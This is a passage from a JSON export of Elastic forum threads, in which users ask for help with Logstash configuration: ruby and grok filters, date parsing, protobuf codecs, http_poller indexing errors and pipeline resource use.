    "date": "April 9, 2020, 12:59pm April 9, 2020, 2:33pm April 21, 2020, 9:47am April 21, 2020, 11:36am",
    "body": "Hi All, I have a real strange behavior with ruby filters. I am using Elastic Stack 7.6.0 on Docker containers. This I have see occurs when an event get splitted ( with the split filter ) or when the event gets cloned ( with the clone filter ). The use case if the following: I need to calculate next calendar month starting on the first day. For this I do the following: Use a ruby filter to get the date filed and split for the month and yeat like so: ruby { id => \"RubyDateYM\" code => \" event.set('tfzz_orgY',event.get('tfzz_startDate').split('-')[0]); event.set('tfzz_orgM',event.get('tfzz_startDate').split('-')[1]) \" } I transform the fields to integer mutate { id => \"MutateYM\" convert => {\"tfzz_orgY\" => \"integer\"} convert => {\"tfzz_orgM\" => \"integer\"} } Then comes the ruby filter I think is has problems with: I added the variable reset after the filter to validate if the filter gets executed only once. You can see that this is the case. ruby { id => \"RubySLACalculation\"` init => \"@M=0;@X=0;@DT='';@MS='';@MM=0;@XX=0\" code => \"@M=event.get('tfzz_orgM'); @X=event.get('tfzz_orgY') if (@M == 12 || @M == '12') then @MM = 1; @XX= @X.to_i + 1; else @MM = @M.to_i + 1; @XX= @X.to_i; end if @MM == 10 @MS = @MM.to_s; elsif @MM == 11 @MS = @MM.to_s; elsif @MM == 12 @MS = @MM.to_s; else @MS = '0'+@MM.to_s; end @DT=@XX.to_s+'-'+@MS+'-01'; event.set('tfzz_slaStartDate',@DT); event.set('tfzz_slaM',@MS); event.set('tfzz_slaY',@XX.to_s)\" @MS=''; @MM=0; @XX=0; @DT=''; } Then I do an elasticsearch filter that fails, sometimes. elasticsearch { id => \"ESCalendar\" hosts => [\"elasticsearch:9200\"] user => \"elastic\" password => \"changeme\" index => \"belegcalendar*\" sort => \"inDate:desc\" query => \"(MM:%{tfzz_slaM}) AND (YY:%{tfzz_slaY})\" fields => { \"date27\" => \"tfzz_slaTargetDate\" } #remove_field => [\"tfzz_slaY\",\"tfzz_slaM\" ] } You can see this in the logs: `[2020-04-09T10:41:08,602][WARN ][logstash.outputs.elasticsearch][nb-ems-beleginfo_ndm] Could not index event to Elasticsearch. {:status=>400, :action=>[\"update\", {:_id=>\"DBEN0019222960\", :_index=>\"nb-jms-beleginfo-ndm-2020.04.09\", :routing=>nil, :_type=>\"_doc\", :retry_on_conflict=>1}, #<LogStash::Event:0x5fb0ad2a>], :response=>{\"update\"=>{\"_index\"=>\"nb-jms-beleginfo-ndm-2020.04.09\", \"_type\"=>\"_doc\", \"_id\"=>\"DBEN0019222960\", \"status\"=>400, \"error\"=>{\"type\"=>\"mapper_parsing_exception\", \"reason\"=>\"failed to parse field [tfzz_slaStartDate] of type [date] in document with id 'DBEN0019222960'. Preview of field's value: '2020--01'\", \"caused_by\"=>{\"type\"=>\"illegal_argument_exception\", \"reason\"=>\"failed to parse date field [2020--01] with format [strict_date_optional_time||epoch_millis]\", \"caused_by\"=>{\"type\"=>\"date_time_parse_exception\", \"reason\"=>\"Failed to parse with all enclosed parsers\"}}}}}}` [2020-04-09T10:50:37,376][WARN ][logstash.filters.elasticsearch][nb-ems-beleginfo_ndm] Failed to query elasticsearch for previous event {:index=>\"belegcalendar*\", :error=>\"[400] {\\\"error\\\":{\\\"root_cause\\\":[{\\\"type\\\":\\\"query_shard_exception\\\",\\\"reason\\\":\\\"Failed to parse query [(MM:) AND (YY:0)]\\\",\\\"index_uuid\\\":\\\"CDe-qZAfTuuo3RFDJZgQ9A\\\",\\\"index\\\":\\\"belegcalendar\\\"}],\\\"type\\\":\\\"search_phase_execution_exception\\\",\\\"reason\\\":\\\"all shards failed\\\",\\\"phase\\\":\\\"query\\\",\\\"grouped\\\":true,\\\"failed_shards\\\":[{\\\"shard\\\":0,\\\"index\\\":\\\"belegcalendar\\\",\\\"node\\\":\\\"UvjcT6bISwGlQy_Mk05JQw\\\",\\\"reason\\\":{\\\"type\\\":\\\"query_shard_exception\\\",\\\"reason\\\":\\\"Failed to parse query [(MM:) AND (YY:0)]\\\",\\\"index_uuid\\\":\\\"CDe-qZAfTuuo3RFDJZgQ9A\\\",\\\"index\\\":\\\"belegcalendar\\\",\\\"caused_by\\\":{\\\"type\\\":\\\"parse_exception\\\",\\\"reason\\\":\\\"Cannot parse '(MM:) AND (YY:0)': Encountered \\\\\\\" \\\\\\\")\\\\\\\" \\\\\\\") \\\\\\\"\\\\\\\" at line 1, column 4.\\\\nWas expecting one of:\\\\n <BAREOPER> ...\\\\n \\\\\\\"(\\\\\\\" ...\\\\n \\\\\\\"*\\\\\\\" ...\\\\n <QUOTED> ...\\\\n <TERM> ...\\\\n <PREFIXTERM> ...\\\\n <WILDTERM> ...\\\\n <REGEXPTERM> ...\\\\n \\\\\\\"[\\\\\\\" ...\\\\n \\\\\\\"{\\\\\\\" ...\\\\n <NUMBER> ...\\\\n \\\",\\\"caused_by\\\":{\\\"type\\\":\\\"parse_exception\\\",\\\"reason\\\":\\\"Encountered \\\\\\\" \\\\\\\")\\\\\\\" \\\\\\\") \\\\\\\"\\\\\\\" at line 1, column 4.\\\\nWas expecting one of:\\\\n <BAREOPER> ...\\\\n \\\\\\\"(\\\\\\\" ...\\\\n \\\\\\\"*\\\\\\\" ...\\\\n <QUOTED> ...\\\\n <TERM> ...\\\\n <PREFIXTERM> ...\\\\n <WILDTERM> ...\\\\n <REGEXPTERM> ...\\\\n \\\\\\\"[\\\\\\\" ...\\\\n \\\\\\\"{\\\\\\\" ...\\\\n <NUMBER> ...\\\\n \\\"}}}}]},\\\"status\\\":400}\"} If I check the context of the event I get the following: image956×430 46.1 KB As you can see from the timestamp, it appear no to execute the filter at least once. Either it retains the value of the varible of the previous event or doesnt calculate it at all. Any guidance will be very appreciated. Thanks a lot, Daniel",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "dffe9bca-f20a-4ebb-8c63-38e0f390dd19",
    "url": "https://discuss.elastic.co/t/logstash-is-parsing-nginx-log-only-half-of-it/228733",
    "title": "Logstash is Parsing Nginx log only half of it",
    "category": [
      "Logstash"
    ],
    "author": "hispeed",
    "date": "April 19, 2020, 1:54pm April 19, 2020, 3:24pm April 19, 2020, 3:51pm April 19, 2020, 4:47pm April 19, 2020, 5:00pm April 19, 2020, 5:11pm April 19, 2020, 7:30pm April 19, 2020, 7:58pm April 19, 2020, 8:03pm April 21, 2020, 6:42pm April 20, 2020, 4:42am April 20, 2020, 2:40pm April 20, 2020, 6:20pm April 20, 2020, 6:41pm April 20, 2020, 7:02pm April 20, 2020, 7:06pm",
    "body": "I have the following log comming from NGINX as reverse proxy set up. Message: 192.168.1.24 - - [19/Apr/2020:15:39:03 +0200] \"GET /website/static/src/scss/options/colors/website.assets_wysiwyg/user_theme_color_palette.scss.css HTTP/1.0\" 304 0 \"https://maindomain.ch/impressum\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36\" The last part (bold) is not parsed into fields. There is one more problem. The referrer field ist including the \" \" so I have this \"https://maindomain.ch/impressum\" in the field. How can i fix that? This is the logstash filter: if [host][name] == \"SVGXXX-XXXX-01.maindomain.ch\" { if [event][module] == \"nginx\" { if [fileset][name] == \"access\" { mutate { add_tag => [\"anginx\", \"Anginx\"] } if \"anginx\" in [tags] { grok { match => **{ \"message\" => \"%{COMBINEDAPACHELOG}+%{(?:\"(?:%{URI:referrer}|-)\"|%{QS:referrer})}+%{GREEDYDATA:extra_fields}\" }** # remove_field => \"message\" } mutate { add_field => { \"read_timestamp\" => \"%{@timestamp}\" } } date { match => [ \"[nginx][access][time]\", \"dd/MMM/YYYY:H:m:s Z\" ] remove_field => \"[nginx][access][time]\" } useragent { source => \"[nginx][access][agent]\" target => \"[nginx][access][user_agent]\" remove_field => \"[nginx][access][agent]\" } geoip { source => \"[nginx][access][remote_ip]\" target => \"[nginx][access][geoip]\" } } } }",
    "website_area": "discuss",
    "replies": 16
  },
  {
    "id": "a37076ef-dcb0-4f64-b602-959c1ba3d6b1",
    "url": "https://discuss.elastic.co/t/logstash-does-not-map-enum-values-in-protobuf-codec/228859",
    "title": "Logstash does not map enum values in protobuf codec",
    "category": [
      "Logstash"
    ],
    "author": "dhanashri-pitre",
    "date": "April 20, 2020, 12:11pm April 21, 2020, 9:23am",
    "body": "My incoming message has nested protobuf structure, and I am using the protobuf-codec in Kafka-input. Following is my configuration // conf file input { kafka { bootstrap_servers => \"server\" client_id => \"logstash-test-c1\" group_id => \"logstash-test-g1\" topics => \"topic\" auto_offset_reset => \"earliest\" key_deserializer_class => \"org.apache.kafka.common.serialization.ByteArrayDeserializer\" value_deserializer_class => \"org.apache.kafka.common.serialization.ByteArrayDeserializer\" decorate_events => \"true\" codec => protobuf { class_name => \"B::I\" class_file => \"/com/xyz/b/example.pb.rb\" protobuf_root_directory => \"/com/xyz/\" } } output { s3 { access_key_id => \"key_id\" secret_access_key => \"secret\" region => \"region\" bucket => \"bucket\" prefix => \"bucket/%{+YYYY}/%{+MM}/%{+dd}/\" codec => \"json_lines\" } } // Proto class B::I which is referred in class_name syntax = \"proto2\"; package b; option java_package = \"com.xyz.b\"; option java_outer_classname = \"Example\"; import \"c/common.proto\"; message I { required string id = 1; required c.IType i_type = 2; required c.Seller seller = 3; } //Dependent class common.proto syntax = \"proto2\"; package c; option java_package = \"com.xyz.c\"; option java_outer_classname = \"Common\"; enum IType { ABC = 0; PQR = 1; } message Seller { required int64 id = 1; enum SellerType { SEL1 = 0; SEL2 = 1; } required SellerType type = 5; } With this I get following output Json { \"id\":\"56473\", \"i_type\":0, \"seller\": { \"type\":0, \"id\":101 } } Where as I need the output to be { \"id\":\"56473\", \"i_type\": \"ABC\", \"seller\": { \"type\": \"SEL1\", \"id\":101 } } Is there anything wrong with the conf or the protobuf codec does not provide this functionality? Any help is appreciated. Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c790e66a-1096-4dc1-9a39-374be878018d",
    "url": "https://discuss.elastic.co/t/my-logstash-cannot-update-the-date-in-es/228993",
    "title": "My logstash cannot update the date in ES",
    "category": [
      "Logstash"
    ],
    "author": "Echo_yu",
    "date": "April 21, 2020, 8:29am",
    "body": "Hi, I changed the column value of some data in the database, but I found that my logstash did not update the change to Elasticsearch. And I cannot found the sincedb file either.How can I fix this problem？Looking forward to your help. Thanks!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "bdf85538-5eea-44ca-b8a0-ff1fdb1562d9",
    "url": "https://discuss.elastic.co/t/need-help-with-date-filter/228968",
    "title": "Need help with date filter",
    "category": [
      "Logstash"
    ],
    "author": "back2base",
    "date": "April 21, 2020, 6:06am April 21, 2020, 6:30am April 21, 2020, 6:50am",
    "body": "Hello to everyone! I am new to ELK stack so I need help with date filter for rsyslog messages from Aix. I am sending logs from Aix to ELK and here is what I see in logstash stdout: apr 21 08:45:01 myhost logstash[19429]: [2020-04-21T08:45:01,363][WARN ][org.logstash.Event ][main] Error parsing @timestamp string value=2020-04-21T08:45:01.104840+90:21 { \"@timestamp\" => 2020-04-21T08:45:01.363Z, \"tags\" => [ [0] \"timestampparsefailure\" ], \"@timestamp\" => \"2020-04-21T08:45:01.104840+90:21\", \"type\" => \"rsyslog_aix\", \"host\" => \"myhost\", \"syslog-tag\" => \"unix:\", \"@version\" => \"1\", \"message\" => \" The privilege command /usr/bin/vmstat, is executed by user with id 200\" } Currently I am not using any filter for this log type. What filter can I use to solve this error?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1e90456c-9421-465f-b2f9-c2b68f224af2",
    "url": "https://discuss.elastic.co/t/troubleshoot-intermediate-output/228970",
    "title": "Troubleshoot intermediate output",
    "category": [
      "Logstash"
    ],
    "author": "nages",
    "date": "April 21, 2020, 6:06am",
    "body": "Is there anyway to view the output of intermediate events. Say if i have filter block in the followng way , filter { grok { match => { \"message\" => \"%{COMBINEDAPACHELOG}\" } } mutate { convert => { \"bytes\" => \"integer\" } } matches \"timestamp\" with the format \"dd/MMM/YYYY:HH:mm:ss Z\" and formats accordingly date { match => [ \"timestamp\", \"dd/MMM/YYYY:HH:mm:ss Z\" ] locale => en } } How to view the intermediate output generated by each filter block ? one way , i am using is to use outblock for each filter and adding other filters incrementally one by one ..",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5d811fe2-2cdb-420e-92f0-d9e3cd10a663",
    "url": "https://discuss.elastic.co/t/grok-filter-add-field/226902",
    "title": "Grok filter add_field",
    "category": [
      "Logstash"
    ],
    "author": "Jeffreyshoptrader",
    "date": "April 7, 2020, 1:21pm April 7, 2020, 2:42pm April 9, 2020, 7:22am April 9, 2020, 2:41pm April 10, 2020, 5:43am April 21, 2020, 11:11am",
    "body": "Hi, I've tried using a add_field in the grok filter. I want to extract the domain name from the log files I have. I've added those in my Apache logs and see them, but I'm not sure how to extract them. What I have so far is this: input { beats { port => 5044 host => \"5.61.254.238\" } } filter { grok { match => { \"message\" => \"%{COMBINEDAPACHELOG}\" } add_field => [ \"host\" => \"%{host}\" ] } date { match => [ \"timestamp\" , \"dd/MMM/yyyy:HH:mm:ss Z\" ] } } output { elasticsearch { hosts => [\"localhost:9200\"] } stdout { codec => rubydebug } } I'm not sure if it's even correct. I've restarted everything, but don't see it in Kibana. An example of a line from the log file: 84.241.204.141 - - [07/Apr/2020:14:58:17 +0200] \"GET /images/betaalmethodeimages/paynl/mastercard.png HTTP/1.1\" 200 3436 \"https://www.celchi.com/geuren/bners-geuren/yes-r-unlimited-violet-damesparfum\" \"Mozilla/5.0 (Linux; Android 10; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36\" www.celchi.com I hope you guys can help me out!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "ab8dc67a-5ed1-4941-ba20-179eb5414330",
    "url": "https://discuss.elastic.co/t/database-connection-stable/228959",
    "title": "Database connection stable",
    "category": [
      "Logstash"
    ],
    "author": "jagan",
    "date": "April 21, 2020, 5:11am",
    "body": "Hi mates, Could you guide me, i have a scenario where all the main attributes are comming from kafka & some other attributes are comming from oracle db' directly and they both sync and ingest the attributes together into ES index. But sometimes i got the database failure so the sync is not possible.Is there any method that is possible to ingest the failed attributes to other index. Please suggest me. Thanks in advance, Jagan",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c3cc0c0f-ee7e-4ac6-9837-89c5bf5760be",
    "url": "https://discuss.elastic.co/t/can-we-invoke-python-script-in-a-filter-using-log-stash-file/227010",
    "title": "Can we invoke python script in a filter using log stash file",
    "category": [
      "Logstash"
    ],
    "author": "deepikagarre",
    "date": "April 7, 2020, 8:40pm April 20, 2020, 4:42pm April 21, 2020, 3:27am",
    "body": "Can we invoke python script in a filter using log stash file.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "594cd786-7c1b-44da-8802-b470e73e66ee",
    "url": "https://discuss.elastic.co/t/keep-getting-dateparsefailures-in-nexus-logs/228218",
    "title": "Keep getting dateparsefailures in Nexus logs",
    "category": [
      "Logstash"
    ],
    "author": "niudaye123",
    "date": "April 15, 2020, 11:26pm April 16, 2020, 12:52am April 17, 2020, 9:03pm April 20, 2020, 10:11pm April 20, 2020, 10:12pm",
    "body": "Hi, I keep getting the dateparsefailure from a Nexus device, could not figure out what's wrong, can someone take a quick look? Thanks a lot! { \"_index\": \"network-2020.04.14\", \"_type\": \"_doc\", \"_id\": \"OaQHd3EB-3-fVVnV4l2f\", \"_version\": 1, \"_score\": 0, \"_source\": { \"log_date\": \"2020 Apr 13 21:52:17.496 Pacific Daylight Time\", \"host\": \"10.149.10.134\", \"facility\": \"ETH_PORT_CHANNEL\", \"tags\": [ \"cisco\", \"_dateparsefailure\" ], \"@timestamp\": \"2020-04-14T04:52:17.514Z\", \"severity_level\": \"5 - Notification\", \"type\": \"syslog-cisco\", \"fingerprint\": \"852be74a10a7a7dc4b7804789b39449e6eaf2639\", \"message\": \"port-channel110: Ethernet1/10 is down\", \"facility_mnemonic\": \"PORT_DOWN\" }, \"fields\": { \"@timestamp\": [ \"2020-04-14T04:52:17.514Z\" ] }, \"highlight\": { \"host\": [ \"@kibana-highlighted-field@10.149.10.134@/kibana-highlighted-field@\" ], \"host.keyword\": [ \"@kibana-highlighted-field@10.149.10.134@/kibana-highlighted-field@\" ] } } The following is my filter for date: date { match => [ \"log_date\", # IOS \"MMM dd HH:mm:ss.SSS ZZZ\", \"MMM d HH:mm:ss.SSS ZZZ\", \"MMM dd HH:mm:ss ZZZ\", \"MMM d HH:mm:ss ZZZ\", \"MMM dd HH:mm:ss.SSS\", \"MMM d HH:mm:ss.SSS\", # Nexus \"YYYY MMM dd HH:mm:ss.SSS ZZZ\", \"YYYY MMM dd HH:mm:ss ZZZ\", \"YYYY MMM dd HH:mm:ss.SSS\", # Hail marry \"ISO8601\" ]",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "dec29253-c6eb-41c4-afe7-896cfc21d95e",
    "url": "https://discuss.elastic.co/t/pipeline-in-logstash/228920",
    "title": "Pipeline in logstash",
    "category": [
      "Logstash"
    ],
    "author": "elasticforme",
    "date": "April 20, 2020, 6:47pm April 20, 2020, 9:49pm April 20, 2020, 9:49pm",
    "body": "I have multiple pipeline (23) running on a system half of the job runs only once a day and half runs every hour. does each pipeline reserves memory and lock on cpu? system has 24 logical cpu. plenty of memory (98gig) and I have assign 28gig in jvm.options.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6e247bd3-3a67-40b3-bafc-2cb03fb6fece",
    "url": "https://discuss.elastic.co/t/logstash-could-not-index-event-to-elasticsearch/228930",
    "title": "Logstash could not index event to Elasticsearch",
    "category": [
      "Logstash"
    ],
    "author": "S3l3ct3d",
    "date": "April 20, 2020, 8:04pm April 20, 2020, 8:41pm April 20, 2020, 9:07pm",
    "body": "Good afternoon all, I want to preface this post that I am completely new to Elastic and all its components. I am currently working on getting Logstash to produce an API call to our web proxy server. I have searched the interwebs for any information on anyone else that has completed this process with our particular vendor, but I have not been lucky in that aspect. So I will try to explain what I have done here. I installed the \"http_poller\" plugin on my logstash server. Built a pipeline in in Kibana. I can see the index in Kibana, but I am getting errors. Errors from Logstash: [2020-04-20T14:08:06,030][WARN ][logstash.outputs.elasticsearch][Netskope] Could not index event to Elasticsearch. {:status=>400, :action=>[\"index\", {:_id=>nil, :_index=>\"netskope-alerts\", :routing=>nil, :_type=>\"_doc\"}, #LogStash::Event:0x44131609], :response=>{\"index\"=>{\"_index\"=>\"netskope-alerts\", \"_type\"=>\"_doc\", \"_id\"=>\"VPH9mHEBiQ9nb_9agQ9N\", \"status\"=>400, \"error\"=>{\"type\"=>\"illegal_argument_exception\", \"reason\"=>\"mapper [data.file_size] of different type, current_type [long], merged_type [text]\"}}}} [2020-04-20T14:09:04,608][WARN ][logstash.outputs.elasticsearch][Netskope] Could not index event to Elasticsearch. {:status=>400, :action=>[\"index\", {:_id=>nil, :_index=>\"netskope-alerts\", :routing=>nil, :_type=>\"_doc\"}, #LogStash::Event:0x3aaff582], :response=>{\"index\"=>{\"_index\"=>\"netskope-alerts\", \"_type\"=>\"_doc\", \"_id\"=>\"p57-mHEBYBKL1gEnZrc9\", \"status\"=>400, \"error\"=>{\"type\"=>\"illegal_argument_exception\", \"reason\"=>\"mapper [data.file_size] of different type, current_type [text], merged_type [long]\"}}}} [2020-04-20T14:28:06,006][WARN ][logstash.outputs.elasticsearch][Netskope] Could not index event to Elasticsearch. {:status=>400, :action=>[\"index\", {:_id=>nil, :_index=>\"netskope-alerts\", :routing=>nil, :_type=>\"_doc\"}, #LogStash::Event:0x22e5f2cf], :response=>{\"index\"=>{\"_index\"=>\"netskope-alerts\", \"_type\"=>\"_doc\", \"_id\"=>\"lfMPmXEBiQ9nb_9azYSV\", \"status\"=>400, \"error\"=>{\"type\"=>\"illegal_argument_exception\", \"reason\"=>\"mapper [data.file_size] of different type, current_type [long], merged_type [text]\"}}}} I have also added my pipeline code as well: input { http_poller { id => \"Netskope_poller\" urls => { alerts => { method => \"GET\" url => \"https://destination.com/api/v1/alerts?token=sometoken&timeperiod=86400\" headers => { Accept => \"application/json\" } } } # Maximum amount of time to wait for a request to complete request_timeout => 30 # How far apart requests should be schedule => { cron => \"* * * * * UTC\"} # Decode the results as JSON codec => \"json\" } } filter { } output { elasticsearch { index => \"netskope-alerts\" hosts => [\"https://*********.aws.found.io:9243\"] user => \"SomeUser\" password => \"SomePassword\" } } I know the API call works due to running it in postman, I get back the correct json output.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "135fb4b5-48cd-474e-9e6a-4bf08f49fd0a",
    "url": "https://discuss.elastic.co/t/grok-filter-is-not-parsing-the-windows-firewall-logs-for-icmp-traffic/228011",
    "title": "GROK filter is not parsing the windows firewall logs for ICMP traffic",
    "category": [
      "Logstash"
    ],
    "author": "Prabhu_Chinnasamy",
    "date": "April 15, 2020, 12:07am April 15, 2020, 8:48am April 15, 2020, 3:11pm April 15, 2020, 3:34pm April 15, 2020, 3:58pm April 16, 2020, 1:53pm April 20, 2020, 7:05pm",
    "body": "All, I am sending the windows firewall logs to logstash and created a GROK filter to parse the log. my GROK filter is: \"%{TIMESTAMP_ISO8601:TimeStamp} %{WORD:Action} %{WORD:Protocol} %{IP:Source_IP} %{IP:Destination_IP} %{INT:SrcPort} %{INT:DstPort} %{INT:Size} %{GREEDYDATA:Flags} %{GREEDYDATA:Direction} Its parsing the logs perfectly for TCP and UDP protocols but for the ICMP traffic its not doing that. in Kibana all I see for ICMP connections is: image1523×432 32.7 KB Please help.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "fe54f0e4-e604-4db2-9cd8-501535ca2174",
    "url": "https://discuss.elastic.co/t/parsing-measurement-xml-data-using-logstash/226897",
    "title": "Parsing measurement xml data using logstash",
    "category": [
      "Logstash"
    ],
    "author": "yagoza",
    "date": "April 7, 2020, 1:01pm April 7, 2020, 2:45pm April 20, 2020, 4:00pm",
    "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?> <?xml-stylesheet type=\"text/xsl\" href=\"MeasDataCollection.xsl\"?> <measCollecFile xmlns=\"http://www.3gpp.org/ftp/specs/latest/rel-5/32_series/32401-540.zip#measCollec\"> <fileHeader fileFormatVersion=\"32.401 V5.0\" vendorName=\"Nokia\" dnPrefix=\"\"> <fileSender localDn=\"SubNetwork=as1bc,ManagedElement=ces-1\" elementType=\"GmscServer,Vlr\" /> <measCollec beginTime=\"2020-03-22T00:00:00+00:00\" /> </fileHeader> <measData> <managedElement localDn=\"SubNetwork=as1bc,ManagedElement=ces-1\" userLabel=\"\" vcpVersion=\"VM5.82.00\" swVersion=\"R36.28.06.0100\" /> <measInfo> <granPeriod duration=\"PT300S\" endTime=\"2020-03-22T00:05:00+00:00\" /> <measType p=\"1\">VS.ADNSCacheHit</measType> <measType p=\"2\">VS.ADNSCacheMiss</measType> <measType p=\"3\">VS.ADNSDupeQuerySuppress</measType> <measType p=\"4\">VS.ADNSCacheTTLExtended</measType> <measType p=\"5\">VS.DNSQuerySent</measType> <measType p=\"6\">VS.DNSQueryResponse</measType> <measValue measObjLdn=\"Service=h248, ServiceMember=Cabinet_0_Shelf_0_Card_4_Host_0_Pool_0\"> <r p=\"1\">0</r> <r p=\"2\">0</r> <r p=\"3\">0</r> <r p=\"4\">0</r> <r p=\"5\">0</r> <r p=\"6\">0</r> </measValue> <measValue measObjLdn=\"Service=h248, ServiceMember=Cabinet_0_Shelf_1_Card_4_Host_0_Pool_0\"> <r p=\"1\">0</r> <r p=\"2\">0</r> <r p=\"3\">0</r> <r p=\"4\">0</r> <r p=\"5\">0</r> <r p=\"6\">0</r> </measValue> <measValue measObjLdn=\"Service=h248, ServiceMember=Cabinet_0_Shelf_0_Card_4_Host_0_Pool_1\"> <r p=\"1\">0</r> <r p=\"2\">0</r> <r p=\"3\">0</r> <r p=\"4\">0</r> <r p=\"5\">0</r> <r p=\"6\">0</r> </measValue> <measValue measObjLdn=\"Service=h248, ServiceMember=Cabinet_0_Shelf_1_Card_4_Host_0_Pool_1\"> <r p=\"1\">0</r> <r p=\"2\">0</r> <r p=\"3\">0</r> <r p=\"4\">0</r> <r p=\"5\">0</r> <r p=\"6\">0</r> </measValue> <measValue measObjLdn=\"Service=h248, ServiceMember=Cabinet_0_Shelf_0_Card_5_Host_0_Pool_2\"> <r p=\"1\">0</r> <r p=\"2\">0</r> <r p=\"3\">0</r> <r p=\"4\">0</r> <r p=\"5\">0</r> <r p=\"6\">0</r> </measValue> <measValue measObjLdn=\"Service=h248, ServiceMember=Cabinet_0_Shelf_1_Card_5_Host_0_Pool_2\"> <r p=\"1\">0</r> <r p=\"2\">0</r> <r p=\"3\">0</r> <r p=\"4\">0</r> <r p=\"5\">0</r> <r p=\"6\">0</r> </measValue> <measValue measObjLdn=\"Service=h248, ServiceMember=Cabinet_0_Shelf_0_Card_5_Host_0_Pool_3\"> <r p=\"1\">0</r> <r p=\"2\">0</r> <r p=\"3\">0</r> <r p=\"4\">0</r> <r p=\"5\">0</r> <r p=\"6\">0</r> </measValue> <measValue measObjLdn=\"Service=h248, ServiceMember=Cabinet_0_Shelf_1_Card_5_Host_0_Pool_3\"> <r p=\"1\">0</r> <r p=\"2\">0</r> <r p=\"3\">0</r> <r p=\"4\">0</r> <r p=\"5\">0</r> <r p=\"6\">0</r> </measValue> </measInfo> where VS.ADNSCacheHit in` <measType p=\"1\">VS.ADNSCacheHit</measType> represent the variable name and <r p=\"1\">0</r> represent the value for it so i want to have like for ServiceMember=Cabinet_0_Shelf_0_Card_4_Host_0_Pool_0 the variable VS.ADNSCacheHit = 0 , VS.ADNSCacheMiss = 0 please help",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7796e332-d651-40eb-baba-6b042c5b369f",
    "url": "https://discuss.elastic.co/t/grok-unable-to-parse-message-field/228822",
    "title": "Grok unable to parse message field",
    "category": [
      "Logstash"
    ],
    "author": "rschirin",
    "date": "April 20, 2020, 9:11am April 20, 2020, 3:20pm April 20, 2020, 3:40pm April 20, 2020, 3:47pm April 20, 2020, 3:53pm",
    "body": "Hi guys, using an Ansible's plugin I'm trying to send data to Logstash. Eveything seems ok but grok is not able to parse message field; I mean, I'm not able to configure it to work correctly this is the content of my document: { \"_index\": \"jenkins-build-2020.04.20\", \"_type\": \"_doc\", \"_id\": \"3TnUlnEBnHvd3wub4nHB\", \"_version\": 1, \"_score\": null, \"_source\": { \"source_host\": \"https://jenkins.net.com/\", \"host\": \"xxxxx\", \"source\": \"jenkins\", \"@version\": 1, \"message\": [ \"Started by user Mario Rossi\", \"Running as Mario Rossi\", \"Running in Durability level: MAX_SURVIVABILITY\" I'm trying to extract user and I tried a lot of combination on grok but everytime I face a _grokparsefailure. is there anyone that can help me?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "cba47aa1-184b-4f4a-88e0-578163f4a6ee",
    "url": "https://discuss.elastic.co/t/java-io-ioexception-connection-reset-by-peer/228897",
    "title": "java.io.IOException: Connection reset by peer",
    "category": [
      "Logstash"
    ],
    "author": "Konathala_Naveen",
    "date": "April 20, 2020, 3:42pm",
    "body": "We have the Environment Logstash with input plugin as \"TCP-input plugin\" And output to file. And we are sending syslogs using rsyslog to logstash tcp input plugin . But intermittently(after 5 to 6 hours) we are getting [ERROR][logstash.inputs.tcp ] Error in Netty pipeline: java.io.IOException: Connection reset by peer When we are getting this issue,we are reduction in throughput We are using Logstash 6.8.3 TCP input plugin 5.2.2 TCP input plugin mode:server TCP keep Alive: false Can you please help on this.What is the reason for that?And how to fix it.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "16a97528-b908-4a27-bb27-3d8c27d629e0",
    "url": "https://discuss.elastic.co/t/interpreting-sincedb-file/228802",
    "title": "Interpreting sincedb file",
    "category": [
      "Logstash"
    ],
    "author": "nages",
    "date": "April 20, 2020, 7:47am April 20, 2020, 5:03pm",
    "body": "I am seeing the following content in sincedb file 2934664528-52087-851968 0 0 11742951 1586411789.669 C:/demo/logs From the documentation i can see that this is represent with 5 parameters https://www.elastic.co/guide/en/logstash/6.8/plugins-inputs-file.html Last one bing the path of the file First one being inode number . The numbers seems to be very cryptic, is there any way to derive some meanuiful information out of this - like 1586411789.669 - what dates it represents , i know it is last active timestamp 2934664528-52087-851968 - what about this ?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "05416998-d9b2-4e8c-9ff2-e3a00ec2080b",
    "url": "https://discuss.elastic.co/t/memory-or-heap-size/228886",
    "title": "Memory or heap size",
    "category": [
      "Logstash"
    ],
    "author": "Lynd",
    "date": "April 20, 2020, 2:29pm April 20, 2020, 3:22pm April 20, 2020, 3:03pm April 20, 2020, 3:10pm April 20, 2020, 3:17pm",
    "body": "What is ideal heap size of elastic search for nearly millions of records",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "2a05b821-ea73-4ffe-952f-7531d47a397d",
    "url": "https://discuss.elastic.co/t/rename-dynamic-nested-field/228827",
    "title": "Rename dynamic nested field",
    "category": [
      "Logstash"
    ],
    "author": "banst",
    "date": "April 20, 2020, 9:38am April 20, 2020, 10:58am April 20, 2020, 3:13pm",
    "body": "Hello there, Giving this event : { field_name : \"foo\" nested: { foo: \"bar\" } } Is there a way with a mutate filter (or another solution) to transform it to : { field_name : \"foo\" nested: { foo: \"bar\" } new_field: \"bar\" } Obviously the foo property is dynamic, and that's what is causing me a headache. I tried with rename and add_field, but didn't achieve my goal.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0abb4675-7f9f-4b06-b4c1-2879d53f1cfc",
    "url": "https://discuss.elastic.co/t/connect-to-telegram-and-get-logs-in-real-time/228890",
    "title": "Connect to Telegram and get logs in real time",
